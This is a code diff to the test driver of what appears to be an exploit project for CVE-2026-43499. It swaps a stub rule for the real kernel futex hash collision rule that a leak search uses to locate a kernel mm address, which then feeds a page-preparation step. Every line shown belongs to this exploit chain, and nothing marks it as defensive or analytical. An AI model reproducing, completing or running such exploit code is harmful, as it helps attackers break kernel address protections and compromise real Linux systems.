@@ -19,6 +19,7 @@
 #include <unistd.h>
 #include <cstdint>
 
+#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
 #include "backend/cve_2026_43499/leak/snitch_policy.hpp"
 #include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
 #include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
@@ -33,6 +34,8 @@ namespace {
     using ghostlock::backend::cve_2026_43499::leak::ScanRange;
     using ghostlock::backend::cve_2026_43499::leak::ScanStrides;
     using ghostlock::backend::cve_2026_43499::leak::SnitchPatience;
+    using ghostlock::backend::cve_2026_43499::leak::CollisionBuckets;
+    using ghostlock::backend::cve_2026_43499::leak::futex_hash_context_init;
     using ghostlock::backend::cve_2026_43499::leak::SnitchPolicy;
     using ghostlock::backend::cve_2026_43499::leak::SnitchPolicyArgs;
     using ghostlock::backend::cve_2026_43499::leak::SnitchSetup;
@@ -82,14 +85,13 @@ namespace {
         static void exit_child() noexcept { LinuxHeapSeam::exit_child(); }
     };
 
-    /** The one stub: a rule that accepts one address, so the walk has an answer. */
-    struct StubBuckets final {
-        std::uint64_t accept = 0U;
-        [[nodiscard]] std::uint64_t bucket(std::uint64_t address, std::uint64_t candidate) const noexcept {
-            if (candidate == accept) { return 7U; }
-            return 3U + ((address / 0x1000U) % 2U);
-        }
-    };
+    /** The rule the search runs under, on the device: the kernel futex hash, a table size from
+     *  the profile, and the mm the keys belong to. The mm here is a placeholder: on the real path
+     *  it is the object the search is looking for, which is why the preparation needs the address
+     *  before it can prepare anything. A placeholder is enough to exercise the rule, because the
+     *  mm is one constant inside every key the run asks about. */
+    constexpr std::size_t kTableSize = 256U;
+    constexpr std::uint64_t kPlaceholderMm = 0xffff888000000000ULL;
 }  // namespace
 
 int main() {
@@ -100,8 +102,9 @@ int main() {
      *  the reason a stub that accepts one address never accepted anything. */
     const std::uint64_t synthetic = ghostlock::backend::cve_2026_43499::leak::tagged_candidate(
         0x100000U, ghostlock::backend::cve_2026_43499::leak::kCanonicalTag);
-    StubBuckets buckets;
-    buckets.accept = synthetic;
+    CollisionBuckets buckets;
+    (void) futex_hash_context_init(&buckets.context, kTableSize);
+    buckets.mm = kPlaceholderMm;
 
     /* The search half: the region, the cohort words, and the walk. */
     SnitchSetup setup{};
@@ -142,7 +145,7 @@ int main() {
                                reinterpret_cast<std::uint32_t *>(base + 64U)};
 
     /* The policy the preparation polls, wrapping the search the device can actually run. */
-    SnitchPolicy<DeviceSeam, StubBuckets> policy;
+    SnitchPolicy<DeviceSeam, CollisionBuckets> policy;
     policy.buckets = &buckets;
     policy.args.setup = setup;
     policy.args.region = region;
@@ -182,7 +185,7 @@ int main() {
                 self_started.ran ? 1 : 0, policy.ran ? 1 : 0, run_verdict_name(policy.outcome.status),
                 policy.outcome.rounds, policy.outcome.pokes_wanted, policy.outcome.region);
     policy.reset();
-    const auto prepared = prepare_page<DeviceSeam, SnitchPolicy<DeviceSeam, StubBuckets>>(
+    const auto prepared = prepare_page<DeviceSeam, SnitchPolicy<DeviceSeam, CollisionBuckets>>(
         inputs, geometry, waiting, policy);
     /* Report from the preparation own outcome, which is what the production path uses: it
      *  comes back by value and needs nothing read out of the policy afterwards. */
